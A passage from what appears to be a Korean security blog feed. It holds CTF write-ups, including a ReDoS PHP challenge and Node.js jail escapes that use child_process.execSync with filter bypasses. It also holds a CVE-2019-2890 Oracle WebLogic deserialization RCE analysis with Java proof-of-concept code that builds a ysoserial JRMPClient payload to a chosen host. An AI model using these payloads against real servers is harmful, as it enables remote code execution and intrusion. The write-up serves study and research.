class="line">Wrong.... <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;./secret.php&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = preg_match(<span class="string">&quot;/<span class="subst">&#123;$_GET[&#x27;flag&#x27;]&#125;</span>/&quot;</span>, <span class="variable">$flag</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$flag</span> === <span class="variable">$_GET</span>[<span class="string">&#x27;answer&#x27;</span>] &amp;&amp; <span class="variable">$result</span> === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Wrong....&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>문제로 들어오면 위와 같이 나오는데 얼마전에 이런 문제를 본적이 있어서 바로 ReDos가 생각이 났고, 해당 기법으로 슥삭 해주니 플래그가 나왔습니다. 해당 문제와 비슷한 문제가 나중에 webhacking.kr에도 올라온다고 해서 따로 익스 코드는 올리지 않겠습니다.</p><blockquote><p>FLAG : TRUST{2ef0c0b759425eed6d3932c109e0fe74}</p></blockquote><hr><h2 id="Web-nodejail-Not-Solve-400-pts"><a href="#Web-nodejail-Not-Solve-400-pts" class="headerlink" title=" (Web) nodejail (Not Solve) [400 pts]"></a><span style="color:#21C587"></span> (Web) nodejail (Not Solve) [400 pts]</h2><blockquote><p>nodejail 문제는 간단한 제일문제 입니다.</p></blockquote><p><img src="https://github.com/wjddnjs33/image/blob/main/TrustCTF/jail.png?raw=true"></p><p>문제로 들어오면 그냥 입력창 하나가 보입니다. Javasript 코드를 입력해주면 여러가지 문자가 필터링 걸린 것을 확인할 수 있습니다.<br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`child_process`</span>).execSync(<span class="string">`c?t<span class="subst">$&#123;IFS&#125;</span>~~`</span>).toString()</span><br></pre></td></tr></table></figure><p>대회 당시에는 위와 같이 ${IFS}를 이용해서 공백을 우회하는 방식을 이용해서 진행하고 있었습니다. 하지만 위와 같이 아무리 해봐도 <code>err</code>만 반환할 분 아무 일도 일어나지 않아 그냥 포기 했었습니다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`fs`</span>).readdirSync(<span class="string">`./`</span>)</span><br></pre></td></tr></table></figure><p>대회가 끝나고 승주님에게 물어보니 <code>fs</code> 모듈을 이용해서 디텍터리 탐색을 하는 코드를 받을 수 있었다. 위 코드를 보고 한 참 어이가 없었다. <code>fs</code>를 모듈을 이용해서 파일을 읽고, 쓰고만 되는 줄 알았는데 알고 보니 디렉터리를 탐색할 수 있다는 것을 처음 알았기 때문이다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">`child_process`</span>).execSync(<span class="string">`\x63at\x20T\x2a`</span>).toString()</span><br></pre></td></tr></table></figure><p>그리고 두 번째는 경준님은 어케 풀었나 궁금해서 물어보니 위와 같이 위와 같이 16진수를 이용해서 공백을 우회한 것을 보고, 또 어이가 없었다..</p><blockquote><p>TRUST{th1s_1s_3xtrem3_n0d3_j41l}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> ReDos </tag>
            
            <tag> Javascript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-2890 Unserialize RCE in Oracle WebLogic</title>
      <link href="2021/02/10/2021-02-10-CVE-2019-2890/"/>
      <url>2021/02/10/2021-02-10-CVE-2019-2890/</url>
      
        <content type="html"><![CDATA[<p>예전부터 분석을 하고, 글을 작성하려 했지만 게으름 탓인 지 2020년에 할려 했던 걸 지금 하고 있습니다. 이번 취약점은 오라클에서 제공하는 Oracle Fusion Middleware의 웹 로직 서버에서 발견 된 역직렬화 RCE 취약점입니다. 해당 웹 로직 서버에서는 데이터를 T3 프로토콜을 이용해서 전달하는데, 안전하게 전달하기 위해서 <code>Serialize</code> -&gt; <code>encryption</code> -&gt; <code>Decryption</code> -&gt; <code>Unserialize</code>와 같은 과정을 거쳐 전달한다고 합니다. 하지만 데이터에 대한 검증 절차가 존재하지 않아 데이터를 역직렬화 할 때 RCE 취약점이 터지게 됩니다.<br></p><table><thead><tr><th>CVE ID</th><th>Version</th><th>CVSS</th></tr></thead><tbody><tr><td>CVE-2019-2890</td><td>WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0</td><td>7.2</td></tr></tbody></table><p><br>VE-2019-2890는 WebLogic Server <code>10.3.6.0.0</code>, <code>12.1.3.0.0</code>, <code>12.2.1.3.0</code>에서 모두 발생했고, 2019년 10월 16일에 POC가 공개됐고, 10월에 바로 긴급패치를 발표했다고 합니다.<br></p><hr><h2 id="CVE-2019-2890"><a href="#CVE-2019-2890" class="headerlink" title=" CVE-2019-2890"></a><span style="color:#21C587"></span> CVE-2019-2890</h2><p>취약점은 <code>PersistentContext</code> 클래스에서 발생합니다.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeSubject</span><span class="params">(ObjectOutputStream var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ByteArrayOutPutStream var2 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream var3 = <span class="keyword">new</span> ObjectOutputStream(var2);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (SubjectManager.getSubjectManager().isKernelIdentity(<span class="keyword">this</span>._subject)) &#123;</span><br><span class="line">        AuthenticatedSubject var4 = (AuthenticateSubject)SubjectManager.</span><br><span class="line">        getSubjectManager().getAnonymousSubject();</span><br><span class="line">        var3.writeObject(var4);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        var3.writeObject(<span class="keyword">this</span>._subject);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    var3.flush();</span><br><span class="line">    <span class="keyword">byte</span>[] var5 = var2.toByteArray();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (KernelStatus.isServer()) &#123;</span><br><span class="line">        var5 = EncryptionUtil.encrypt(var5);</span><br><span class="line">    &#125;</span><br><span class="line">    var5 = EncryptionUtil.encrypt(var5);</span><br><span class="line">    </span><br><span class="line">    var1.writeInt(var5.length);</span><br><span class="line">    var1.write(var5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>writeSubject</code> 메서드는 데이터를 직렬화 하고, 암호화하는 메서드입니다. <code>Line 5 ~ 11</code>에서 데이터를 직렬화하고, <code>Line 16 ~ 20</code>까지가 암호화하는 부분입니다. 여기서 직렬화할 때 데이터의 대한 검증 로직만 있었으면 해당 취약점은 터지지 않았을 건데, 검증 로직이 없어 취약점까지 연계가 되었습니다. 이렇게 writeSubject 메소드에서 만들어진 직렬화 데이터는 아까 말한 T3 프로토콜을 이용해서 웹 로직 서버로 전송을 하게 됩니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundExeception </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.initTransients();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>._lock.writeLock().lock();</span><br><span class="line">        <span class="keyword">this</span>._propertyMap = (Map)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._propBagClassNames = (Set)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._contextPropertyMap = (Map)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._invocationPropertyMap = (Map)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>._state = (PersistentContext.State)var1.readObject();</span><br><span class="line">        <span class="keyword">this</span>.readsubject(var1);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>._lock.writeLock().unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>직렬화 데이터를 T3 프로토콜로 전송하면 <code>readObject</code> 메서드를 이용해서 받아 <code>readSubject</code> 메서드로 넘겨주는 것을 볼 수 있습니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readSubject</span><span class="params">(ObjectInputStream var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> var2 = var1.readInt();</span><br><span class="line">        <span class="keyword">byte</span>[] var3 = <span class="keyword">new</span> <span class="keyword">byte</span>[var2];</span><br><span class="line">        var1.readFully(var3);</span><br><span class="line">        <span class="keyword">if</span> (KernelStatus.isServer()) &#123;</span><br><span class="line">            var3 = EncryptionUtil.decrypt(var3);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        ByteArrayInputStream var4 = <span class="keyword">new</span> ByteArrayInputStream(var3);</span><br><span class="line">        ObjectInputStream var5 = <span class="keyword">new</span> ObjectInputStream(var4);</span><br><span class="line">        <span class="keyword">this</span>._subject = (AuthenticateSubject)var5.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">        WseeCoreLogger.logUnexpectedException(<span class="string">&quot;Couldn&#x27;t completely read PersistenContext subject&quot;</span>, var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>직렬화 데이터는 <code>readObject</code> 메서드에서 <code>readSubject</code> 메서드로 전달해 줘 받게 됩니다. <code>Line 3 ~ 8</code>에서 데이터를 읽고, 복호화를 하고, <code>Line 10 ~ 12</code>에서 역직렬화를 하는데 바로 이때 RCE가 터집니다.<br></p><p>이로서 우리는 <code>PersistentContext</code> 클래스에서는 직렬화한 데이터를 암호화하고, 전송한다는 것을 알고 있습니다. 그렇기 때문 익스플로잇을 하려면 이를 기반으로 POC를 작성해서 직렬화 데이터를 만들어주어야 합니다. </p><hr><h2 id="CVE-2019-2890-POC"><a href="#CVE-2019-2890-POC" class="headerlink" title=" CVE-2019-2890 POC"></a><span style="color:#21C587"></span> CVE-2019-2890 POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> weblogic.wsee.jaxws.persistence;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> weblogic.kernel.KernelStatus;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span>  </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Registry <span class="title">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> sep = command.indexOf(<span class="number">58</span>);</span><br><span class="line">            String host;</span><br><span class="line">            <span class="keyword">int</span> port;</span><br><span class="line">            <span class="keyword">if</span> (sep &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                port = (<span class="keyword">new</span> Random()).nextInt(<span class="number">65535</span>);</span><br><span class="line">                host = command;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">                port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ObjID id = <span class="keyword">new</span> ObjID((<span class="keyword">new</span> Random()).nextInt());</span><br><span class="line">            TCPEndpoint te = <span class="keyword">new</span> TCPEndpoint(host, port);</span><br><span class="line">            UnicastRef ref = <span class="keyword">new</span> UnicastRef(<span class="keyword">new</span> LiveRef(id, te, <span class="keyword">false</span>));</span><br><span class="line">            RemoteObjectInvocationHandler obj = <span class="keyword">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class="line">            Registry proxy = (Registry)Proxy.newProxyInstance(ysoserial.payloads.JRMPClient.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Registry.class&#125;, obj);</span><br><span class="line">            <span class="keyword">return</span> proxy;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">            System.setProperty(<span class="string">&quot;com.bea.core.internal.client&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">            <span class="comment">//KernelStatus.setIsServer(true);</span></span><br><span class="line">            PersistentContext pc = <span class="keyword">new</span> PersistentContext(<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;poc.ser&quot;</span>);</span><br><span class="line">            ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">            objectOutputStream.writeObject(pc);</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>위 java code가 main poc 코드입니다. 위 poc 클래스를 이용해 직렬화 데이터를 만들어야 합니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeSubject</span><span class="params">(ObjectOutputStream var1)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ByteArrayOutPutStream var2 = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream var3 = <span class="keyword">new</span> ObjectOutputStream(var2);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//    if (SubjectManager.getSubjectManager().isKernelIdentity(this._subject)) &#123;</span></span><br><span class="line"><span class="comment">//        AuthenticatedSubject var4 = (AuthenticateSubject)SubjectManager.</span></span><br><span class="line"><span class="comment">//        getSubjectManager().getAnonymousSubject();</span></span><br><span class="line"><span class="comment">//        var3.writeObject(var4);</span></span><br><span class="line"><span class="comment">//    &#125; else &#123;</span></span><br><span class="line"><span class="comment">//        var3.writeObject(this._subject);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">[+] var3.writeObject(Poc.getObject());</span><br><span class="line"></span><br><span class="line">    var3.flush();</span><br><span class="line">    <span class="keyword">byte</span>[] var5 = var2.toByteArray();</span><br><span class="line">    </span><br><span class="line"><span class="comment">//    if (KernelStatus.isServer()) &#123;</span></span><br><span class="line"><span class="comment">//        var5 = EncryptionUtil.encrypt(var5);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">    var5 = EncryptionUtil.encrypt(var5);</span><br><span class="line">    </span><br><span class="line">    var1.writeInt(var5.length);</span><br><span class="line">    var1.write(var5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위와 같이 writeSubject 메서드에서 <code>Poc.getObject</code>를 추가하면 됩니다. 하지만 일단 직렬화 데이터를 만들기 전에는 4가지 문제점이 생기는데 이를 모두 해결해줘야 합니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; com.bea.core.security.managers.NotSupportedException</span><br><span class="line">    at weblogic.security.service.SecurityServiceManager.isKernelIdentity(SecurityServiceManager.java:546)</span><br><span class="line">    at weblogic.wsee.jaxws.persistence.PersistenContext.&lt;init&gt;(PersistentContext.java:168)</span><br><span class="line">    at weblogic.wsee.jaxws.persistence.Poc2.main(Poc2.java:27)</span><br></pre></td></tr></table></figure><ol><li>첫 번째 오류는 PersistenContext 객체를 만들 때 발생합니다. 이 에러는 PersistenContext를 초기화 중에 호출 하는데 <code>SecurityServiceManager.isKernelIdentity</code> 메서드를 이용해서 커널 ID를 체크하는데 이때 에러를 내뱉고 직렬화를 종료하게 됩니다.<br></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> bollean <span class="title">isKernelIdentity</span><span class="params">(AuthenticatedSubject var0)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> NotSupportedException();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>isKernelIdentity</code> 메서드에서 <code>NotSupportedException</code> 메서드를 호출하는 것을 볼 수 있습니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PersistenContext(<span class="meta">@NotNull</span> String var1, <span class="meta">@NotNull</span> Map&lt;String, Serializable&gt; var2, <span class="meta">@NotNull</span> Set&lt;String&gt; var3, <span class="meta">@Nullable</span> Map&lt;String, Serializable&gt; var4, <span class="meta">@NotNull</span> Map&lt;String, Serializable&gt; var5) &#123;</span><br><span class="line">    <span class="keyword">super</span>(var1);</span><br><span class="line">    <span class="keyword">this</span>._propertyMap = var2;</span><br><span class="line">    <span class="keyword">this</span>._proBagClassNames = var3;</span><br><span class="line">    <span class="keyword">this</span>._contextPropertyMap = var4;</span><br><span class="line">    <span class="keyword">this</span>._invocationPropertyMap = var5;</span><br><span class="line">    <span class="keyword">this</span>._state = PersistentContext.State.UNUSED;</span><br><span class="line">   AuthenticatedSubject var6 = getCurrentSubject();</span><br><span class="line"><span class="comment">//      if (SecurityServiceManager.isKernelIdentity(var(6)) &#123;</span></span><br><span class="line"><span class="comment">//          throw new IllegalStateException(&quot;Attempt to create PersistentContext using kernel identity. All actions that can create PersistentContext must run as a user principal&quot;);</span></span><br><span class="line"><span class="comment">//      &#125; else &#123;</span></span><br><span class="line"><span class="comment">//          this._subject = var6;</span></span><br><span class="line"><span class="comment">//          this._initTransients();</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line">    <span class="keyword">this</span>._subject = var6;</span><br><span class="line">    <span class="keyword">this</span>.initTransients();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>첫 번재 문제는 위와 같이 <code>PersistenContext</code>에서 <code>isKernelIdentity</code> 메서드를 이용한 조건문을 모두 주석 처리함으로 해결할 수 있습니다.<br></p><ol start="2"><li>두 번째 문제는 <code>deserialization PersistenContext</code> 클래스가 중단되는 것 입니다. </li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersistentContext</span> <span class="keyword">extends</span> <span class="title">AbstractStorable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> AuthenticatedSubject KERNEL_ID = (AuthenticatedSubject)AccessController.doPrivileged(PrivilgedActions.getKernelIdentityAction());</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> ReentranReadWriteLock _lock;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Serializable&gt; _propertyMap;</span><br><span class="line">    </span><br><span class="line">    (생략)</span><br></pre></td></tr></table></figure><p><code>PersistentContext</code> 클래스를 보면 <code>AuthenticatedSubject</code>를 초기화하는 것을 볼 수 있습니다.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> SubjectManager <span class="title">getSubjectManager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Object var0 = ceSubjectManagerLock; var0 (slot_0): Object@<span class="number">661</span></span><br><span class="line">    <span class="keyword">synchronized</span>(ceSubjectManagerLock) &#123;</span><br><span class="line">        <span class="keyword">while</span>(ceSubjectManager == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ceClient) &#123;</span><br><span class="line">                ceSubjectManager = SubjectManagerFactory.getInstance().getSubjectManager();</span><br><span class="line">                <span class="keyword">return</span> ceSubjectManager;</span><br><span class="line">             &#125;</span><br><span class="line">             </span><br><span class="line">             <span class="keyword">try</span> &#123;</span><br><span class="line">                 ceSubjectManagerLock.wait();</span><br><span class="line">             &#125; <span class="keyword">catch</span> (InterruptedException var3) &#123;</span><br><span class="line">                 <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(var3);</span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ceSubjectManager;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>AuthenticatedSubject</code>를 초기화 할 때는 위 코드가 실행되는데 <code>ceClient</code>의 값이 <code>True</code>가 아니라면 무한 루프에 빠지는 것을 볼 수 있습니다. <code>ceSubjectManagerLock.wait</code> 메서드에서는 직렬화가 실행되지 않습니다. 그리고 <code>ceClient</code>는 시스템 속성이기 때문에 <code>com.bea.core.internal.client</code>을 이용해서 <code>True</code>를 설정할 수 있습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private static final bollean ceClient &#x3D; &quot;true&quot;.equalsIgnoreCase(System.getProperty( key:&quot;com.bea.core.internal.client&quot;, def:&quot;false&quot;));</span><br></pre></td></tr></table></figure><p>그래서 위와 같이 <code>ceClient</code> 변수를 설정해주면 무한루프에 빠지지 않아 두 번째 문제도 해결할 수 있습니다.<br></p><ol start="3"><li>세 번째 문제는 직렬화 데이터가 암호화되지 않는다는 것 입니다.<br></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] encrypt(<span class="keyword">byte</span>[] var0) &#123;</span><br><span class="line">    <span class="keyword">return</span> Kernel.isServer() ? getEncryptionService().encryptBytes(var0) : var0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>EncryptionUtilencrypt</code>를 확인해보면 <code>isServer</code> 메서드 값이 참이면 암호화한 값을 넣어주고, 참이 아니면 암호화하지 않고 원본을 반환하는 것을 볼 수 있습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KernelStatus.setIsServer(true)</span><br></pre></td></tr></table></figure><p>그래서 직렬화 데이터를 암호화하기 전에 위 구문을 정의해줌으로서 <code>isServer</code> 값이 참이 되게 만들면 직렬화 데이터가 잘 암호회되어 세 번째 문제도 해결할 수 있습니다.<br></p><ol start="4"><li>네 번째 문제는 암호화에 사용되는 <code>SerializedSystemIni.dat</code> 파일이 없다는 겁니다. 해당 문제를 해결하기 위해서는 현재 웹 로직에서 사용되고 있는 <code>SerializedSystemIni.dat</code> 파일을 poc 디렉터리에 넣어주면 됩니다.</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">    System.setProperty(<span class="string">&quot;com.bea.core.internal.client&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">    <span class="comment">//KernelStatus.setIsServer(true);</span></span><br><span class="line">    PersistentContext pc = <span class="keyword">new</span> PersistentContext(<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">    FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;poc.ser&quot;</span>);</span><br><span class="line">    ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">    objectOutputStream.writeObject(pc);</span><br><span class="line">    objectOutputStream.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4가지의 문제를 모두 해결하였으면 <code>poc.ser</code> 파일을 